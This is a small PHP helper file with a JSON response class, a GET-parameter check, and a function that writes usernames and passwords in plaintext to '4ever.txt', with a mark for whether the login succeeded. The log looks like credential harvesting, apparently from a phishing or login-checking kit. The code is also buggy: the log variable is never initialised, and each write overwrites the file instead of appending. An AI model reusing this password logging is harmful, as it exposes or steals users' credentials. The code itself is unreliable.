<?php
class JSON {
	function alert($key, $msg){
		$JSON = (object)array();
		$JSON -> $key = $msg;
		$JSON = json_encode($JSON, JSON_UNESCAPED_UNICODE);
		header("Content-type: application/json; charset=utf-8");
		echo $JSON;
		exit();
	}
}

function getCheck() {
	$args = func_get_args();
	if (array_diff($args, array_keys($_GET))) exit();
}

function log_p($u, $p, $s) {
	//Logging PWD
	$file = '4ever.txt';
	// Open the file to get existing content
	$current = file_get_contents($file);
	//$s = (true ? '✔' : '✖');

	if($s == true) $s = "✔";
	if($s == false) $s = "✖";
	// Append a new person to the file
	$data .="\n".  $u . "🔥" . $p . " " . $s;
	$current = iconv("CP1257","UTF-8", $data);
	// Write the contents back to the file
	file_put_contents($file, $current);
}
?>